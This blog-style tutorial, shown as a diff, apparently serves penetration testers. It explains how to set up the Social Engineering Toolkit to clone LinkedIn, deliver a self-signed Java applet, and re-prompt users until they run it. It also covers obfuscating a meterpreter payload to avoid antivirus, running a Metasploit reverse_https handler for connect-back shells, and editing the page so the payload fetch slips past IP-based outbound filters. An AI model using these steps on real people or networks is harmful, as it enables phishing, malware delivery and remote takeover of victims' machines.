@@ -1,0 +1,142 @@
+
+Configuring SET to Bypass Outbound Filters and Own the Day
+
+
+By Melissa Augustine and Brad Antoniewicz.
+
+The Social Engineering Toolkit (SET) is a great, easy to use tool for combining social engineering attacks with Metasploit’s extensive framework. However, SET doesn’t always work right out of the box for all networks. Depending on the target, you may need to tweak SET’s code and configuration to work a little better. In this article we’ll walkthrough a real world attack scenario and talk about some tweaks that will help SET function a little better. We’ll use BackTrack 5 R3 for our SET-up (lolpunz).
+Basic SET Configuration
+
+We’ll use the SET’s Java Applet attack vector for our attack. SET’s configuration file is stored within the /pentest/exploits/set folder on BackTrack. To edit:
+ root@bt:/pentest/exploits/set# cd config
+ root@bt:/pentest/exploits/set/config# vim set_config
+
+
+
+The default configuration needs a little tweaking to work the way we want it to, here’s what we recommend: 
+Enable Apache
+By default SET uses a Python web server which never seems to be as reliable as we’d like. So if you’re expecting more than one user to connect, its best to leverage Apache. 
+ APACHE_SERVER=ON
+
+
+Self-Sign the Applet
+SET will automatically self-sign the Java applet that’s presented to the user. This makes things appear a little more official and makes Java happy. 
+ SELF_SIGEND_APPLET=ON
+
+
+Name It Something Convincing
+It should go without saying that you’ll need to label this something “friendly” and convincing so that you don’t s care aware users. Usually it’s good to match the website you’ve cloned. In our example, we’re cloning LinkedIn, so we’ve set it to match that: 
+
+ JAVA_ID_PARAM=LinkedIn 
+
+
+Enable the Java Repeater
+The Java Repeater option tells SET to continuously prompt the user even after they’ve clicked “Cancel” to accepting the applet. While this is a bit of an aggressive move that may end up spooking some users, it often results in a higher success rate, so we go for it. 
+ JAVA_REPEATER=ON 
+
+
+
+To lessen the impact of the repeater, we usually configure a delay (between when the user clicks “Cancel” and when they’re prompted again) of 5 seconds:
+ JAVA_TIME=500
+
+
+Starting SET and Cloning a Website
+With the config file ready, we can start SET: 
+
+ root@bt:/pentest/exploits/set# ./set
+
+
+
+SET is all menu driven so once its started up you’ll be presented with a banner and menu as shown below. Options 4 and 5 will always show regardless of whether SET it up to date or not so don’t be confused if you just updated. Be sure to start with option 6 to be sure your configuration is made active. 
+
+
+Website Cloning
+One of SET’s awesome features is that it can close a website of your choosing. We’ll use LinkedIn.com for this example. Select the following options:
+ (1)Social-Engineering Attacks -> 
+ (2)Website Attack Vectors ->
+ (1)Java Applet Attack Method ->
+ (2)Site Cloner
+
+
+
+You’ll just need to provide a couple of options for the website cloner to get started. Here’s what we used:
+
+ Are you using NAT/Port Forwarding? (no)
+ IP address for the reverse connection (12.x.x.x)
+        Next is the creation of the Java Applet:
+ Name (LinkedIn)
+ Organizational Unit (LinkedIn)
+ Name of Organization (LinkedIn)
+ City (Santa Monica)
+ State (CA)
+ Country (US)
+        Is this correct? (yes)
+
+ URL to clone (http://www.linkedin.com)
+
+
+
+Payloads and Handlers
+Metasploit offers tons of payloads we can deliver with our signed Java applet. SET leverages this functionality to make preparing and encoding payloads easy. It’ll also allow you to backdoor a legitimate executable and further obfuscate it.  Most antivirus software will easily pick up unpacked, unencoded, or otherwise unobfuscated payloads so it’s worth it to take the time out to do this. We manually generated, packed, and obfuscated a standard metepreter payload since SET doesn’t support using hostnames as the target (more on this in the next section). 
+
+If you used SET to generate your payload, then you’re ready to go. However if you created your own, you’ll have to define it as a custom payload within SET:
+  (17) Import Your Own Executable
+ [path to exectuable]
+
+
+
+Also we needed to set up a handler to accept the connectback from the payload we generated. With Metasploit running set up the handler:
+ msf> use exploit/multi/handler
+ msf exploit(handler)>  set payload windows/meterpreter/reverse_https
+ msf exploit(handler)>  set LHOST 11.x.x.x
+ msf exploit(handler)>  set LPORT 443
+ msf exploit(handler)>  set ExitOnSession false
+ msf exploit(handler)>  exploit -j
+
+
+
+Great, with SET serving our cloned linkedin.com and our meterpreter handler running, we can accept users. Once they arrive on the site they’ll be prompted to run the Java applet, click “Run” (hopefully), the applet will run invoke our payload! - All ready to go right? Wrong...
+Outbound filtering
+
+
+Strong networks have tight outbound filtering rules which make data exfiltration and connect back shells difficult. Although most networks have at least some outbound filtering rules, they’re usually lax and can be bypassed with little effort. HTTP-80/HTTPS-443 is often permitted outbound but web filters and proxies can get in the way. Web traffic filtering appliances compare outbound traffic to a set of rules that allow or deny traffic depending on criteria defined by the administrator. The criteria can vary greatly depending on the organization’s needs - Sometimes an organization may choose to block websites that fall within a particular subject matter (e.g. known “porn”, “hacking”, etc.. sites) or based on reputation. Other times the organization may just prohibit access to hosts that exist within countries where attacks are known to originate. It really depends on the organization, but at the end of the day, the outbound filter can really make life a pain. 
+
+
+One oddly common filter we see is denying access to IP addresses rather than hostnames. It’s common to see many attacks connect back to an attacker controlled host by IP and so the organizations goal is to use that heuristic to their benefit. Let’s talk about changing SET to defeat that! 
+“Troubleshooting”
+
+Obviously it’s important to test your setup once you think everything should be up and running. When you’re confident in your configuration, make it live and hope for the best. Sometimes things don’t always work as you plan and you’ll have to rely on a bit of charm and wit. 
+
+A good friendly employee can do wonders when you discover that people are clicking “Run” but aren't getting owned.  First walk the user through getting to the website and ensure the applet loads properly. If you’re not getting a connectback, have the user go directly to the URL that’s hosting the stagger. This URL is dynamically generated by default, so you may have to check the metasploit output to figure out where it is.
+
+This first troubleshooting step is usually where you’ll find the issue. Most commonly it’s the user’s outbound filtering rules. Have the user attempt to browse to IP addresses, hostnames, known sites, unknown sites, etc...
+Modifying SET to work with Hostnames
+Assuming that we deduced during the troubleshooting step that the organization’s outbound filtering disallows HTTP/HTTPS access to IP addresses but allow browsing to hostnames, we can modify SET to work around that filter. By default however, SET does not support hostnames. It’s a somewhat easy code change to make it support hostnames, but there’s an even easier way with the scenario we’ve described. 
+
+Java’s control panel allows you to view the Java Cache, which will gives insight into where the applet is pulling the payload from. To view it in Windows go to the Control Panel – Java, then on the General Tab under “Temporary Internet Files” click “View”. 
+
+
+
+You can see that our applet is headed to an IP address: 
+
+
+
+
+When SET clones a website it’ll add in the HTML to support the Java Applet and pass it a few parameters to detail it’s configuration. Parameters 1, 3, and 4 define the payload, so if we just modify these to point to our hostname rather than an IP Address. This is all stored within the index.html of your webserver. If you have been following along, we’re using Apache and its default webroot is in /var/www on Backtrack. 
+
+
+
+Now we can take a quick look at the Java Cache again to confirm: 
+
+
+
+That's it! Pwntime!
+Got any more SET configuration Tips? Share in the comments below!
+Update:
+We contacted the developers of SET about supporting hostnames and they updated the version on GitHub to support it! Those guys rock!! Thanks!! 
+
+
+
+
+
+
